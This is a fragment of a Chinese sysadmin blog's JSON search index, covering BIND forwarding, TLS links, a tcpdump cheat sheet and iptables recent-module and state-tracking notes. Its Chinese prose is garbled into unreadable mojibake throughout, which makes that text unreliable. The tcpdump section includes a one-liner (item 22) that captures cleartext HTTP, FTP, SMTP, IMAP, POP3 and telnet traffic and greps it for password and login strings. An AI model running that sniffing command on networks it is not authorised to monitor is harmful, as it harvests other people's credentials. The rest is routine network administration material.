åªä¼šä½¿ç”¨forwardersæŒ‡å®šçš„DNSæœåŠ¡å™¨åšè§£æï¼Œå¦‚æœæŸ¥è¯¢ä¸åˆ°åˆ™è¿”å›DNSæŸ¥è¯¢å¤±è´¥ ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:3","tags":["dns"],"title":"DNSæœåŠ¡bindè½¬å‘é…ç½®ç®€ä»‹","uri":"/post/2365/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å›¾è§£TLS: http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html åŒ…å«æ‰€æœ‰tcpåè®®çš„æ•°æ®åŒ…: 94119-2mbupgg2bcm.png åªåŒ…å«tlsåè®®çš„æ•°æ®åŒ…: 65726-11z46o0z2r5m.png å•å‘è¯ä¹¦é€šä¿¡è¿‡ç¨‹: 13627-vmxhnvh1y9d.png ","date":"2021-05-08 13:35","objectID":"/post/2364/:0:0","tags":["https","ssl","tls"],"title":"SSLã€TLSé€šä¿¡è¿‡ç¨‹","uri":"/post/2364/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å»ºè®®é˜…è¯»ä»¥ä¸‹æ–‡ç« : SSLä¸æ•°å­—è¯ä¹¦ï¼ˆå…¨äº”ç« ï¼‰: https://www.2cto.com/Article/201203/121534.html æµ…ææ•°å­—è¯ä¹¦: https://www.cnblogs.com/hyddd/archive/2009/01/07/1371292.html æ•°å­—ç­¾åæ˜¯ä»€ä¹ˆï¼Ÿ: http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html æ•°å­—è¯ä¹¦åŸç†: https://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html å¥½æ–‡æ€•æ¶ˆå¤±ï¼Œå¤‡ç”¨é“¾æ¥: SSLä¸æ•°å­—è¯ä¹¦ï¼ˆå…¨äº”ç« ï¼‰: https://www.soulchild.cn/ssltls/121534.html æ•°å­—è¯ä¹¦åŸç†: https://www.soulchild.cn/ssltls/æ•°å­—è¯ä¹¦åŸç†.html ","date":"2021-05-07 17:40","objectID":"/post/2361/:0:0","tags":["https","ssl","tls"],"title":"SSLã€TLSã€å…¬é’¥ã€ç§é’¥ã€æ•°å­—ç­¾åã€æ•°å­—è¯ä¹¦ç­‰å­¦ä¹ ","uri":"/post/2361/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‚è€ƒåœ°å€: https://www.tcpdump.org/manpages/tcpdump.1.html https://danielmiessler.com/study/tcpdump/ https://www.tcpdump.org/manpages/pcap-filter.7.html ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:1","tags":["tcpdump"],"title":"tcpdump-å‘½ä»¤ä½¿ç”¨","uri":"/post/2354/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‘½ä»¤æ ¼å¼: tcpdump å‚æ•° è¿‡æ»¤å™¨è¡¨è¾¾å¼ ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:2","tags":["tcpdump"],"title":"tcpdump-å‘½ä»¤ä½¿ç”¨","uri":"/post/2354/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æè¿°: tcpdumpå¯ä»¥æ•è·ç³»ç»Ÿä¸­çš„ç½‘ç»œæ•°æ®åŒ…ã€‚ å½“tcpdumpå®Œæˆæ•è·æ•°æ®åŒ…æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªç»Ÿè®¡è¿”å›(ç»“æœç±»ä¼¼å¦‚ä¸‹ï¼Œæœ€åä¸‰è¡Œ)ï¼š 81349-gtoq0yio2ju.png captured: è¿™æ˜¯tcpdumpå·²æ¥æ”¶å’Œå¤„ç†çš„æ•°æ®åŒ…æ•° received by filter: å«ä¹‰å–å†³äºè¿è¡Œtcpdumpå‘½ä»¤çš„æ“ä½œç³»ç»Ÿ åœ¨æŸäº›æ“ä½œç³»ç»Ÿä¸Šï¼Œå®ƒä¼šå¯¹æ•°æ®åŒ…è¿›è¡Œè®¡æ•°ï¼Œè€Œä¸ç®¡å®ƒä»¬æ˜¯å¦ä¸è¿‡æ»¤è¡¨è¾¾å¼åŒ¹é…ï¼Œä¹Ÿä¸ç®¡tcpdumpæ˜¯å¦å·²è¯»å–å¹¶å¤„ç†å®ƒä»¬ã€‚ åœ¨æŸäº›æ“ä½œç³»ç»Ÿä¸Šï¼Œå®ƒåªè®¡ç®—è¢«è¿‡æ»¤å™¨è¡¨è¾¾å¼åŒ¹é…çš„æ•°æ®åŒ…ï¼Œè€Œä¸ç®¡tcpdumpæ˜¯å¦å·²ç»è¯»å–å’Œå¤„ç†äº†å®ƒä»¬ åœ¨æŸäº›æ“ä½œç³»ç»Ÿä¸Šï¼Œå®ƒåªè®¡ç®—è¢«è¿‡æ»¤å™¨è¡¨è¾¾å¼åŒ¹é…å¹¶è¢«tcpdumpå¤„ç†çš„æ•°æ®åŒ… dropped by kernel: ç”±äºç¼“å†²åŒºç©ºé—´ä¸è¶³ï¼Œè€Œè¢«tcpdumpä¸¢å¼ƒçš„æ•°æ®åŒ…æ•°é‡ï¼Œå¯ä»¥é€šè¿‡-Bå‚æ•°è®¾ç½®ç¼“å†²åŒºå¤§å°ã€‚ ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:3","tags":["tcpdump"],"title":"tcpdump-å‘½ä»¤ä½¿ç”¨","uri":"/post/2354/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‚æ•°: å‚æ•°è¾ƒå¤šï¼Œè§£é‡Šä¸€éƒ¨åˆ† -A: ä»¥ASCIIæ ¼å¼æ‰“å°æ¯ä¸ªæ•°æ®åŒ…(å‡å»å…¶é“¾è·¯çº§æŠ¥å¤´)ã€‚ä¾¿äºæŠ“å–httpè¯·æ±‚ã€‚ -B (--buffer-size=buffer_size): è®¾ç½®æ•è·ç¼“å†²åŒºå¤§å°ï¼Œå•ä½ä¸ºKiB(1024 bytes). -c: æ”¶åˆ°æŒ‡å®šæ•°æ®åŒ…åé€€å‡ºã€‚ -e: æ˜¾ç¤ºmacåœ°å€ -w: å°†æ•è·åˆ°çš„æ•°æ®åŒ…è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚æ–‡ä»¶åæ”¯æŒä½¿ç”¨strftimeæ ¼å¼(ä¾‹å¦‚: -w test-%H%M%S.pcap) -r: ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®åŒ…ï¼ˆä½¿ç”¨-wé€‰é¡¹ä¿å­˜çš„pcapæ–‡ä»¶ï¼‰ã€‚å¦‚æœæ–‡ä»¶ä¸º-ï¼Œåˆ™ä½¿ç”¨æ ‡å‡†è¾“å…¥ã€‚ -G: æ¯éš”å¤šé•¿æ—¶é—´è¾“å‡ºä¸€ä¸ªæ–‡ä»¶(æ–‡ä»¶åä¸èƒ½ä¸€æ ·ï¼Œå¦åˆ™ä¼šè¦†ç›–)ï¼Œå•ä½ç§’(s) -C: å½“ä½¿ç”¨-wå°†æ•°æ®åŒ…ä¿å­˜åˆ°æ–‡ä»¶æ—¶,å•ä¸ªæ–‡ä»¶ä¿å­˜çš„æœ€å¤§å¤§å°ã€‚1ä»£è¡¨å°†è¿‘1M(1000000 bytes) -D: æ˜¾ç¤ºæ“ä½œç³»ç»Ÿä¸­å¯ä»¥ä½¿ç”¨çš„ç½‘ç»œæ¥å£ -E: é€šè¿‡æä¾›åŠ å¯†å¯†é’¥æ¥è§£å¯†IPSECé€šä¿¡ã€‚ -F: æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè¿‡æ»¤å™¨è¡¨è¾¾å¼å°†ä»è¿™ä¸ªæ–‡ä»¶ä¸­è·å–ã€‚ -i (--interface=interface): æŒ‡å®šæ•è·å“ªä¸ªç½‘ç»œæ¥å£çš„æ•°æ®åŒ…,é»˜è®¤æ˜¯tcpdump -Dæ˜¾ç¤ºçš„ç¬¬ä¸€ä¸ªæ¥å£ã€‚ -l: åœ¨æ•è·åˆ°æ•°æ®åŒ…æ—¶ç«‹å³å°†è¾“å‡ºå†™å…¥æ ‡å‡†è¾“å‡ºï¼Œè€Œä¸æ˜¯ç­‰å¾…å¡«æ»¡ç¼“å†²åŒºå†å†™å…¥æ ‡å‡†è¾“å‡ºã€‚è¿™æ ·å¯ä»¥è®©è¾“å‡ºå®æ—¶åœ°æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œè€Œä¸æ˜¯ç­‰åˆ°ç¼“å†²åŒºæ»¡äº†å†ä¸€æ¬¡æ€§æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚tcpdump -l | tee dat or tcpdump -l \u003e dat \u0026 tail -f dat -n: ä¸å°†ipè§£ææˆåç§° -nn: ä¸å°†ipè§£ææˆåŸŸåï¼Œä¸å°†ç«¯å£è§£ææˆåç§° -#: æ‰“å°æ•°æ®åŒ…ç¼–å· --print: å½“ä½¿ç”¨-wæ—¶ï¼Œstdoutä¸ä¼šæœ‰æ•°æ®åŒ…ä¿¡æ¯è¾“å‡ºï¼ŒåŠ æ­¤å‚æ•°å¯ä»¥åŒæ—¶è¾“å‡º.è€ç‰ˆæœ¬ä¸æ”¯æŒæ­¤å‚æ•° -Q: æ•°æ®åŒ…æ–¹å‘(in,out,inout),ä¸æ˜¯åœ¨æ‰€æœ‰å¹³å°éƒ½å¯ä»¥ç”¨ -q: æ‰“å°æ›´å°‘çš„åè®®ä¿¡æ¯ -S: æ˜¾ç¤ºç»å¯¹çš„seqç¼–å·ã€‚é»˜è®¤å•æ–¹å‘ç¬¬ä¸€ä¸ªæ¡ç›®æ˜¾ç¤ºç»å¯¹seqç¼–å·ï¼Œåé¢çš„æ•°æ®åŒ…æ˜¾ç¤ºçš„æ˜¯ç›¸å¯¹çš„seqç¼–å·ã€‚(ä¸çŸ¥è¿™ä¹ˆè§£é‡Šå¯¹ä¸å¯¹)çœ‹ä¸‹å›¾å§ 50576-2l4oigizl9u.png -s: æŒ‡å®šä»æ¯ä¸ªæ•°æ®åŒ…ä¸­è·å–æ•°æ®çš„å­—èŠ‚æ•°ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„262144å­—èŠ‚ã€‚-s0å’Œé»˜è®¤å€¼ä¸€æ · -t: ä¸æ˜¾ç¤ºæ—¶é—´ -tt: æ˜¾ç¤ºæ—¶é—´æˆ³ -ttt: ä¸ä¸Šä¸€æ¡çš„æ—¶é—´å¢é‡,è¯¦ç»†è¯·çœ‹manæ‰‹å†Œ -tttt: å¯è¯»æ€§å¼ºçš„æ—¶é—´ -v: æ‰“å°IPæ•°æ®åŒ…ä¸­çš„ttlï¼Œflagsï¼Œæ€»é•¿åº¦å’Œé€‰é¡¹ç­‰ä¿¡æ¯ -vv: æ›´è¯¦ç»†çš„è¾“å‡ºã€‚ -vvv: æ›´è¯¦ç»†çš„è¾“å‡ºã€‚ -X: æ•°æ®åŒ…å†…å®¹ä»¥16è¿›åˆ¶å’Œasciiæ ¼å¼æ˜¾ç¤º -XX: åŒä¸Šï¼Œä¿¡æ¯å¯èƒ½æ›´å¤š ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:4","tags":["tcpdump"],"title":"tcpdump-å‘½ä»¤ä½¿ç”¨","uri":"/post/2354/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"è¿‡æ»¤å™¨è¡¨è¾¾å¼ è¿‡æ»¤è¡¨è¾¾å¼ç”±ä¸€ä¸ªæˆ–å¤šä¸ªåŸè¯­ç»„æˆã€‚åŸè¯­çš„ç¼–å†™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªå±‚é¢: ç±»å‹: æ ¹æ®ä¸»æœºã€ç½‘ç»œã€ç«¯å£ç­‰ä¿¡æ¯è¿‡æ»¤ã€‚å¦‚: hostã€netã€portã€portrangeç­‰ã€‚ ä¾‹å¦‚: host xxx.com(ä¹Ÿå¯ä»¥å†™ip),net 192.168.1.0/24,port 20(è¿™é‡Œä»…ä»£è¡¨tcpå’Œudp),portrange 6000-6008 ä¼ è¾“æ–¹å‘: æ ¹æ®æºå’Œç›®çš„è¿›è¡Œè¿‡æ»¤ã€‚å¦‚: src, dst, src or dst,src and dstç­‰ã€‚ ä¾‹å¦‚: src 192.168.1.10,dst 192.168.1.20 src or dst 192.168.1.1,src and dst 192.168.1.1,src or dst port 20 dst net 128.3.0.0 åè®®: åŸºäºåè®®è¿›è¡Œè¿‡æ»¤ã€‚å¦‚: tcpã€udpã€icmpã€ipã€ip6ã€arpã€rarpã€wlanç­‰ã€‚ ä¾‹å¦‚: arp net 128.3, tcp port 21, udp portrange 7000-7009 å¸¸ç”¨åŸè¯­ tcpdumpæ•è·çš„æ•°æ®åŒ…å’Œè¡¨è¾¾å¼åŒ¹é…ç»“æœä¸ºtrueï¼Œæ‰æ˜¯æˆ‘ä»¬ä¹Ÿè¦çš„ç»“æœï¼Œè¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨and(\u0026\u0026),or(||),not(!), dst: ç›®æ ‡ä¸»æœºã€‚dst host 1.1.1.1ä¹Ÿå¯ä»¥å†™æˆdst 1.1.1.1.å› ä¸ºé»˜è®¤æ˜¯hostï¼Œhostå¯ä»¥è¢«çœç•¥ src: æºä¸»æœºã€‚ ether dst: etherçš„ç›®æ ‡åœ°å€(macåœ°å€) ether src: etherçš„æºåœ°å€(macåœ°å€) net: ç½‘ç»œ(ç½‘æ®µ) dst net: ç›®æ ‡ç½‘ç»œ src net: æºç½‘ç»œ port: ç«¯å£ dst port: ç›®æ ‡ç«¯å£ src port: æºç«¯å£ portrange: ç«¯å£èŒƒå›´ dst portrange: ç›®æ ‡ç«¯å£èŒƒå›´ src portrange: æºç«¯å£èŒƒå›´ less: æ•°æ®åŒ…çš„é•¿åº¦å°äºæˆ–ç­‰äºæŒ‡å®šé•¿åº¦ã€‚less 32ç­‰åŒäºlen \u003c= 32 greater: æ•°æ®åŒ…çš„é•¿åº¦å¤§äºæˆ–ç­‰äºæŒ‡å®šé•¿åº¦ã€‚less 32ç­‰åŒäºlen \u003e= 32 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:5","tags":["tcpdump"],"title":"tcpdump-å‘½ä»¤ä½¿ç”¨","uri":"/post/2354/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¾‹å­: 1.æ•è·æºå’Œç›®çš„æ˜¯soulchild.cnç›¸å…³çš„æµé‡ tcpdump host soulchild.cn 2.æ•è·eth0ç½‘å¡çš„æµé‡ tcpdump -i eth0 3.æ ¹æ®æºåœ°å€å’Œç›®çš„åœ°å€æ•è·æµé‡ tcpdump src 1.1.1.1 tcpdump dst 1.0.0.1 4.æ•è·æºå’Œç›®çš„æ˜¯1.2.3.0/24ç½‘æ®µçš„æµé‡ tcpdump net 1.2.3.0/24 5.æ•è·ä¸æŒ‡å®šç«¯å£ç›¸å…³çš„æµé‡ tcpdump port 3389 tcpdump src port 1025 tcpdump dst port 80 6.æ•è·æŒ‡å®šåè®®çš„æµé‡ tcpdump tcp tcpdump ip6 tcpdump icmp 7.æ•è·æŒ‡å®šç«¯å£èŒƒå›´çš„æµé‡ tcpdump portrange 20-21 8.æ ¹æ®æ•°æ®åŒ…å¤§å°æ•è·æµé‡ tcpdump less 32 tcpdump greater 64 tcpdump 'len \u003c= 128' 9.å°†æ•è·çš„æ•°æ®åŒ…ä¿å­˜è‡³æ–‡ä»¶å’Œä»æ–‡ä»¶è¯»å– # ä¿å­˜è‡³æ–‡ä»¶ä¸­ tcpdump -w soulchild.cn.pcap 'host soulchild.cn and port 80' # ä»æ–‡ä»¶è¯»å– tcpdump -r soulchild.cn.pcap # ä¿å­˜åˆ°æ–‡ä»¶ä¸­å¹¶åŒæ—¶åœ¨stdoutè¾“å‡º tcpdump --print -w soulchild.cn.pcap 'host soulchild.cn and port 80' 10.å¯è¯»æ€§è¾ƒé«˜çš„ä¸€ç§å‚æ•°ç»„åˆ tcpdump -ttnnvvS 11.æºåœ°å€æ˜¯10.5.2.3å‘é€åˆ°ä»»æ„ä¸»æœºçš„3389ç«¯å£çš„æ•°æ®åŒ… tcpdump -nnvvS src 10.5.2.3 and dst port 3389 12.æ•è·ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œçš„æ•°æ®åŒ… tcpdump -nvX src net 192.168.0.0/16 and dst net 10.0.0.0/8 or 172.16.0.0/16 13.æ•è·ç›®çš„åœ°å€æ˜¯192.168.0.2å¹¶ä¸”ä¸æ˜¯icmpçš„æ•°æ®åŒ… tcpdump 'dst 192.168.0.2 and not icmp' # æŒ‡å®šåè®®çš„å¦ä¸€ç§å†™æ³• tcpdump 'dst 192.168.0.2 and not proto \\icmp' 14.æ•è·192.168.0.2è¿›æ¥çš„æµé‡ï¼Œå¹¶ä¸”ä¸æ˜¯22ç›®çš„ç«¯å£çš„æµé‡ tcpdump -vv src 192.168.0.2 and not dst port 22 *æ ¹æ®tcpçŠ¶æ€è¿›è¡Œé€‰æ‹© tcpæ ‡å¿—å¯ç”¨å­—æ®µtcp-fin, tcp-syn, tcp-rst, tcp-push, tcp-ack, tcp-urg, tcp-ece, tcp-cwr. 15.æ•è·åŒ…å«rstæ ‡å¿—ä½çš„tcpæ•°æ®åŒ… tcpdump 'tcp[13] \u0026 4!=0' tcpdump 'tcp[tcpflags] == tcp-rst' 15.1.æ•è·åŒ…å«synæ ‡å¿—ä½çš„tcpæ•°æ®åŒ… tcpdump 'tcp[13] \u0026 2!=0' tcpdump 'tcp[tcpflags] == tcp-syn' 15.2.æ•è·åŒ…å«synå’Œackçš„tcpæ•°æ®åŒ… tcpdump 'tcp[13]=18' tcpdump 'tcp[tcpflags] \u0026 (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' 16.æŸ¥æ‰¾http user-agent tcpdump -vvAls0 | grep 'User-Agent:' 19.è·å–GETè¯·æ±‚ tcpdump -vvAls0 | grep 'GET' 20.æ•è·DNSæµé‡ tcpdump -vvAs0 port 53 21.æ•è·NTPæµé‡ tcpdump -vvAs0 port 123 22.æŸ¥æ‰¾æ˜æ–‡å¯†ç  tcpdump -lA port http or port ftp or port smtp or port imap or port pop3 or port telnet | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user ' 23.æ•è·æŒ‡å®šçŠ¶æ€çš„icmpåŒ… icmpå¯ç”¨å­—æ®µicmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redirect, icmp-echo, icmp-routeradvert, icmp-routersolicit, icmp-timxceed, icmp-paramprob, icmp-tstamp, icmp-tstampreply, icmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply. #æ•è·icmp-echo(è¯·æ±‚åŒ…) tcpdump icmp[icmptype] = icmp-echo #æ•è·icmp-echoreply(å“åº”åŒ…) tcpdump icmp[icmptype] = icmp-echoreply #æ•è·ä¸æ˜¯icmp-echoã€icmp-echoreplyçš„çŠ¶æ€ tcpdump icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply 24.æŸ¥æ‰¾å¸¦æœ‰\"Evil Bit\"çš„æµé‡ IPæŠ¥å¤´ä¸­æœ‰ä¸€ä½æ°¸è¿œä¸ä¼šè¢«åˆæ³•åº”ç”¨ç¨‹åºè®¾ç½®ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º\"Evil Bit\"ã€‚ tcpdump 'ip[6] \u0026 128 != 0' è¿™é‡Œæœ‰ä¸€ä¸ªtcpdumpé«˜çº§ç”¨æ³•çš„è§£é‡Š: https://blog.csdn.net/zhaojie0708/article/details/103496004 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:6","tags":["tcpdump"],"title":"tcpdump-å‘½ä»¤ä½¿ç”¨","uri":"/post/2354/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"é¡¹ç›®åœ°å€: https://github.com/man-pages-zh/manpages-zh ä½¿ç”¨æ–¹æ³•(centos/redhat): yum install man-pages-zh-CN export LANG=zh_CN.utf-8 å‘½ä»¤è¡Œè¾“å…¥man å‘½ä»¤,æŸ¥çœ‹å¸®åŠ© man ls 09290-go66pces8p7.png ","date":"2021-04-28 11:03","objectID":"/post/2352/:0:0","tags":["linux"],"title":"linux-ä¸­æ–‡manæ‰‹å†Œ","uri":"/post/2352/"},{"categories":["åŸºç¡€å†…å®¹","ç³»ç»ŸæœåŠ¡"],"content":"recentæ¨¡å— è¿™ä¸ªæ¨¡å—ä¼šå°†åŒ¹é…çš„è§„åˆ™ä¸­ï¼ŒæºIPåœ°å€å†™åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œè¿˜æ”¯æŒé€šè¿‡åˆ›å»ºæ—¶é—´æ¥åŒ¹é…è¿™ä¸ªåˆ—è¡¨ä¸­çš„IPã€‚ å­˜å‚¨çš„å†…å®¹åœ¨/proc/net/xt_recent/åˆ—è¡¨åç§° --name name æŒ‡å®šä¸€ä¸ªåˆ—è¡¨åç§° [!] --set å°†æ•°æ®åŒ…çš„æºIPæ·»åŠ åˆ°åˆ—è¡¨ä¸­ã€‚å¦‚æœæºåœ°å€å·²ç»åœ¨åˆ—è¡¨ä¸­ï¼Œåˆ™æ›´æ–°ç°æœ‰æ¡ç›®(æ¯”å¦‚æ—¶é—´æˆ³)ã€‚ [!] --rcheck æ£€æŸ¥å½“å‰è§„åˆ™ä¸­æ•°æ®åŒ…çš„æºIPï¼Œæ˜¯å¦å­˜åœ¨äºæŒ‡å®šçš„åˆ—è¡¨ä¸­ [!] --update æ£€æŸ¥å½“å‰è§„åˆ™ä¸­æ•°æ®åŒ…çš„æºIPï¼Œæ˜¯å¦å­˜åœ¨äºæŒ‡å®šçš„åˆ—è¡¨ä¸­ï¼Œå¦‚æœå­˜åœ¨ï¼Œè¿˜ä¼šæ›´æ–°æ—¶é—´æˆ³ [!] --remove æ£€æŸ¥å½“å‰è§„åˆ™ä¸­æ•°æ®åŒ…çš„æºIPï¼Œæ˜¯å¦å­˜åœ¨äºæŒ‡å®šçš„åˆ—è¡¨ä¸­ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šåˆ é™¤è¿™ä¸ªåœ°å€ [!] --seconds seconds * æ­¤é€‰é¡¹å¿…é¡»ä¸--rcheckæˆ–--updateä¸€èµ·ä½¿ç”¨ã€‚ è¿™ä¸ªé€‰é¡¹åªä¼šæ£€æŸ¥æŒ‡å®šç§’å†…çš„IPåœ°å€ã€‚ æ¯”å¦‚: --rcheck --seconds 10: æ£€æŸ¥å½“å‰è§„åˆ™ä¸­æ•°æ®åŒ…çš„æºIPï¼Œæ˜¯å¦å­˜åœ¨äºæŒ‡å®šçš„åˆ—è¡¨ä¸­ï¼Œè¿™ä¸ªIPå¿…é¡»æ˜¯åœ¨10ç§’å†…è¢«å†™å…¥åˆ—è¡¨çš„ [!] --hitcount hits * æ­¤é€‰é¡¹å¿…é¡»ä¸--rcheckæˆ–--updateä¸€èµ·ä½¿ç”¨ã€‚ è¦æ±‚æ¥æ”¶åˆ°çš„æ•°æ®åŒ…å¤§äºç­‰äºæŒ‡å®šçš„æ¬¡æ•°(å‘½ä¸­æ¬¡æ•°)ã€‚ æ¯”å¦‚: --rcheck --hitcount 3: åªæœ‰æºIPï¼Œç¬¬ä¸‰æ¬¡(æˆ–ä»¥ä¸Š)å­˜åœ¨äºåˆ—è¡¨ä¸­æ‰ä¼šåŒ¹é…æˆåŠŸ è¿™ä¸ªé€‰é¡¹ä¹Ÿå¯ä»¥ç»“åˆ--secondsé€‰é¡¹æ˜¯ä½¿ç”¨ã€‚ æ¯”å¦‚: --rcheck --hitcount 3 --seconds 10: åªæœ‰æºIPï¼Œç¬¬ä¸‰æ¬¡(æˆ–ä»¥ä¸Š)å­˜åœ¨äºåˆ—è¡¨ä¸­,å¹¶ä¸”æ˜¯10ç§’å†…çš„ï¼Œæ‰ä¼šåŒ¹é…æˆåŠŸ --rttl: * æ­¤é€‰é¡¹å¿…é¡»ä¸--rcheckæˆ–--updateä¸€èµ·ä½¿ç”¨ã€‚ è¦æ±‚æ¥æ”¶åˆ°çš„æ•°æ®åŒ…TTLå€¼å’Œ--setç”Ÿæ•ˆæ—¶è®¾ç½®çš„ä¸€æ ·ã€‚ æ‰‹åŠ¨æ“ä½œåˆ—è¡¨ä¸­çš„IP # å°†æŒ‡å®šçš„IPæ·»åŠ åˆ°åˆ—è¡¨ä¸­ echo xx.xx.xx.xx \u003e /proc/net/ipt_recent/DEFAULT # åˆ é™¤æŒ‡å®šçš„IP echo -xx.xx.xx.xx \u003e /proc/net/ipt_recent/DEFAULT # æ¸…ç©ºåˆ—è¡¨ echo clear \u003e /proc/net/ipt_recent/DEFAULT æ¨¡å—æœ¬èº«å‚æ•°çš„é»˜è®¤å€¼ï¼š ip_list_tot=100 æ¯ä¸ªåˆ—è¡¨ä¿å­˜çš„IPæ•°é‡ ip_pkt_list_tot=20 æ¯ä¸ªipçš„å½“å‰æ•°æ®åŒ…è®¡æ•°(å½“å‰æ˜¯ç¬¬å‡ ä¸ªåŒ…) ip_list_hash_size=0 å“ˆå¸Œè¡¨å¤§å°ï¼Œ0è¡¨ç¤ºæ ¹æ®ip_list_totè®¡ç®—ï¼Œå…¶é»˜è®¤å€¼ä¸º512 ip_list_perms=0644 ipåˆ—è¡¨æ–‡ä»¶æƒé™/proc/net/ipt_recent/* debug=0 è®¾ç½®ä¸º1ï¼Œå¯ä»¥è·å¾—æ›´å¤šè°ƒè¯•ä¿¡æ¯ ä¿®æ”¹æ–¹æ³•: # 1.åœæ­¢iptables(å¦‚æœéœ€è¦ä¿å­˜åˆ«å¿˜è®°ä¿å­˜è§„åˆ™) service iptables stop # 2.ç§»é™¤xt_recentæ¨¡å— modprobe -r xt_recent # 3.ä¿®æ”¹å‚æ•° vim /etc/modprobe.d/xt_recent.conf options xt_recent ip_list_tot=1000 ip_pkt_list_tot=60 # 4.åŠ è½½xt_recentæ¨¡å— modprobe xt_recent # 5.æ£€æŸ¥é…ç½®å‚æ•° grep -r '.*' /sys/module/xt_recent/parameters/ # 6.å¯åŠ¨iptables service iptables start ä½¿ç”¨ç¤ºä¾‹ï¼š eg1.æ¯ä¸ªIPåªå…è®¸åœ¨5ç§’å†…å»ºç«‹2ä¸ªåŸºäºtcp 80ç«¯å£çš„è¿æ¥ # æ£€æŸ¥5ç§’å†…çš„ipåˆ—è¡¨ä¸­æºIPæ˜¯å¦å­˜åœ¨2ä¸ª iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --name webpool --rcheck --seconds 5 --hitcount 2 -j DROP # æ”¾è¡ŒNEWçŠ¶æ€çš„æ•°æ®åŒ…ï¼Œå¹¶è®°å½•è‡³ipåˆ—è¡¨ iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --name webpool --set -j ACCEPT # æ”¾è¡ŒESTABLISHEDçŠ¶æ€çš„æ•°æ®åŒ… iptables -A INPUT -p tcp --dport 80 -m state --state ESTABLISHED -j ACCEPT eg2.åœ¨è¿æ¥sshå‰ï¼Œå…ˆä½¿ç”¨pingæ‰èƒ½è¿æ¥ # åŒ¹é…icmpè¯·æ±‚åŒ…(åŒ…å¤§å°ä¸º29),å¹¶å°†æºIPåŠ å…¥ipåˆ—è¡¨ï¼ˆsudo ping 192.168.10.150 -s 1ï¼‰ iptables -I INPUT -p icmp --icmp-type 8 -m length --length 29 -m recent --name sshlogin --set -j REJECT --reject-with icmp-host-unreachable # å…è®¸10ç§’å†…å­˜åœ¨äºåˆ—è¡¨ä¸­çš„IPè¿æ¥22ç«¯å£ iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --name sshlogin --rcheck --seconds 10 -j ACCEPT # å…è®¸ESTABLISHEDçŠ¶æ€çš„sshè¿æ¥ iptables -A INPUT -p tcp --dport 22 -m state --state ESTABLISHED -j ACCEPT ","date":"2021-04-27 11:00","objectID":"/post/2347/:0:1","tags":["iptables"],"title":"iptables-æ¨¡å—\u0026amp;è§„åˆ™è®°å½•","uri":"/post/2347/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æœ¬æ–‡å¼•è‡ª: https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#STATEMACHINEï¼Œä¿®æ”¹äº†éƒ¨åˆ†å†…å®¹ï¼Œä¾¿äºè‡ªå·±ç†è§£ ","date":"2021-04-23 15:54","objectID":"/post/2337/:0:0","tags":["iptables"],"title":"iptablesçŠ¶æ€æœºåˆ¶(è¿æ¥è·Ÿè¸ªæœºåˆ¶)","uri":"/post/2337/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€æ¦‚è¿° çŠ¶æ€æœºåˆ¶(è¿æ¥è·Ÿè¸ª)æ˜¯iptablesä¸­ç‰¹æ®Šçš„ä¸€éƒ¨åˆ†ï¼ŒçŠ¶æ€æœºåˆ¶å¯ä»¥è®©NetfilterçŸ¥é“æŸä¸ªç‰¹å®šè¿æ¥çš„çŠ¶æ€ã€‚ åœ¨iptablesé‡Œï¼ŒåŒ…æ˜¯å’Œ çŠ¶æ€æœºåˆ¶çš„å››ç§ä¸åŒçŠ¶æ€æœ‰å…³çš„ã€‚å®ƒä»¬æ˜¯NEWï¼ŒESTABLISHEDï¼ŒRELATEDå’ŒINVALIDã€‚ ä½¿ç”¨-m --stateåŒ¹é…æ“ä½œï¼Œæˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“åœ°æ§åˆ¶ â€œè°æˆ–ä»€ä¹ˆèƒ½å‘èµ·æ–°çš„ä¼šè¯â€ã€‚ æ‰€æœ‰åœ¨å†…æ ¸ä¸­ç”±Netfilterçš„ç‰¹å®šæ¡†æ¶åšçš„è¿æ¥è·Ÿè¸ªç§°ä½œconntrackï¼ˆè¯‘è€…æ³¨ï¼šå°±æ˜¯connection tracking 